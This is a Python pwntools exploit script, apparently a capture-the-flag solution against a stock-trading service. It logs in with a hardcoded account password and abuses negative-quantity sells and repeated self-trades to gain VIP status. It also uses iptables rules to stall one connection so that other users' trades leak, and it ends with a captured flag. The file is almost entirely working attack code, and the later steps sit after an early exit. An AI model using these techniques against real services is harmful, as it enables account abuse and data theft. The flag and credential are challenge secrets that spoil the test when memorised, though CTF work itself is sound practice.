#!/usr/bin/env python3
#
# @abiondo @carlomara @fioraldi @mebeim - 2024-05-05
#

from pwn import *
from collections import namedtuple
import subprocess


Order = namedtuple('Order', ['client_id', 'ticker', 'price', 'quantity', 'submission_time'])
Trade = namedtuple('Trade', ['buyer_id', 'seller_id', 'ticker', 'price', 'quantity', 'executed_at'])


class Client:
	def __init__(self, host: str, port: int):
		self.r = remote(host, port)
		self.username = None
		self.password = None

	def create_account(self, username: str, password: str):
		self.r.sendlineafter(b'> ', b'1')
		self.r.sendlineafter(b'username>', username.encode())
		self.r.sendlineafter(b'password>', password.encode())

	def login(self, username: str, password: str):
		self.username = username
		self.password = password
		self.r.sendlineafter(b'> ', b'2')
		self.r.sendlineafter(b'username>', username.encode())
		self.r.sendlineafter(b'password>', password.encode())

	def logout(self):
		self.r.sendlineafter(b'> ', b'8')

	def login_incomplete(self):
		assert self.username is not None
		self.r.sendlineafter(b'> ', b'2')
		self.r.sendlineafter(b'username>', self.username.encode())

	def login_incomplete_complete(self):
		assert self.password is not None
		self.r.sendlineafter(b'password>', self.password.encode())

	def buy(self, ticker: str, quantity: int, price: float):
		self.r.sendlineafter(b'> ', b'1')
		self.r.sendlineafter(b'> ', ticker.encode())
		self.r.sendlineafter(b'> ', str(quantity).encode())
		self.r.sendlineafter(b'> ', str(price).encode())

	def sell(self, ticker: str, quantity: int, price: float):
		self.r.sendlineafter(b'> ', b'2')
		self.r.sendlineafter(b'> ', ticker.encode())
		self.r.sendlineafter(b'> ', str(quantity).encode())
		self.r.sendlineafter(b'> ', str(price).encode())

	def view_account_info(self):
		self.r.sendlineafter(b'> ', b'3')
		self.r.recvuntil(b'password: ')
		password = self.r.recvline(keepends=False)
		self.r.recvuntil(b'balance: ')
		balance = int(self.r.recvline(keepends=False))
		self.r.recvuntil(b'num trades: ')
		num_trades = int(self.r.recvline(keepends=False))
		self.r.recvuntil(b'user_id: ')
		user_id = int(self.r.recvline(keepends=False))
		self.r.recvuntil(b'Positions:')

		lines = self.r.recvuntil(b'1) Buy').splitlines()
		lines = filter(None, map(bytes.strip, lines))

		positions = []
		for l in lines:
			if l == b'---':
				positions.append((ticker, quantity))
				ticker = qunatity = None
			elif l.startswith(b'ticker: '):
				ticker = l[len(b'ticker: '):]
			elif l.startswith(b'quantity: '):
				quantity = int(l[len(b'quantity: '):])

		return password, balance, num_trades, user_id, positions

	def view_recent_trades_norecv(self):
		self.r.sendline(b'5')

	def recv_recent_trades(self):
		lines = self.r.recvuntil(b'1) Buy', drop=True).splitlines()
		lines = filter(None, map(bytes.strip, lines))

		trades = []
		for l in lines:
			if b'buyer_id: ' in l:      buyer_id = int(l.split(b': ')[1])
			elif l.startswith(b'seller_id: '):   seller_id = int(l.split(b': ')[1])
			elif l.startswith(b'ticker: '):      ticker = l.split(b': ')[1]
			elif l.startswith(b'price: '):       price = float(l.split(b': ')[1])
			elif l.startswith(b'quantity: '):    quantity = int(l.split(b': ')[1])
			elif l.startswith(b'executed at: '):
				executed_at = float(l.split(b': ')[1])
				trades.append(Trade(buyer_id, seller_id, ticker, price, quantity, executed_at))

		return trades

	def display_preference(self, preference: int):
		self.r.sendlineafter(b'> ', b'7')
		self.r.sendlineafter(b'> ', str(preference).encode())

	def add_position(self, ticker: str, quantity: int):
		self.sell(ticker, -quantity, 1e9)

	def make_self_trade(self, ticker: str):
		self.add_position(ticker, 1)
		self.sell(ticker, 1, 1)
		self.buy(ticker, 1, 1)

	def prepare_mcarlson_vip(self):
		self.sell('Ramon Pena', -100, 600)

		for _ in range(5):
			self.sell('Ramon Pena', 1, 6)

	def make_mcarlson_vip(self):
		self.sell('Ramon Pena', 1, 6)

	def __repr__(self):
		return 'Client(' + self.username + ')'


def net_block_input(r) -> None:
	src_ip = r.sock.getpeername()[0]
	dst_port = r.sock.getsockname()[1]
	cmd = f'sudo iptables -I INPUT 1 -p tcp -s {src_ip} --dport {dst_port} -j DROP'
	print(cmd)
	subprocess.run(cmd, check=True, shell=True)


def net_unblock_input(r) -> None:
	src_ip = r.sock.getpeername()[0]
	dst_port = r.sock.getsockname()[1]
	cmd = f'sudo iptables -D INPUT -p tcp -s {src_ip} --dport {dst_port} -j DROP'
	print(cmd)
	subprocess.run(cmd, check=True, shell=True)

################################################################################


if args.REMOTE:
	host, port = "", ""
else:
	host, port = "127.0.0.1", 8080


mcarlson = Client(host, port)
mcarlson.login('mcarlson', 'deengod420_cowa_freakin_bunga_0988675_soafg')

try:
	context(log_level='debug')
	print(mcarlson.view_account_info())
except:
	pass

mcarlson.r.interactive()
sys.exit(0)

slave = Client(host, port)
slave.create_account('lol', 'a')
slave.login('lol', 'a')
slave.display_preference(3)

master = Client(host, port)
master.create_account('MASTER', 'a')
master.login('MASTER', 'a')
master.display_preference(3)


master.prepare_mcarlson_vip()

# Become vip
master.add_position('AAPL', 100)
for _ in range(18):
	master.sell('AAPL', 1, 1)
	master.buy('AAPL', 1, 1)

master.make_self_trade('Z' * 255)
for _ in range(29):
	master.make_self_trade('Y' * 255)

net_block_input(slave.r)

for _ in range(100):
	slave.view_recent_trades_norecv()

sleep(1)
net_unblock_input(slave.r)

master.make_mcarlson_vip()

# Skip menu
slave.r.recvuntil(b'> ')

trades = []
for _ in range(100):
	trades += slave.recv_recent_trades()

for t in trades:
	if t.ticker not in (b'Y'*255, b'Z'*255, b'Ramon Pena'):
		print(t)

# master.r.interactive()



# flag{PixelPanic9560n24:mftdrjP3XCfERKCiJensnOi7KntDuK4ZWhgSkrb8QIQQUo0xP_vmwscPEwZGD6itG93k7viwRo1K65yWC2zQ0g}
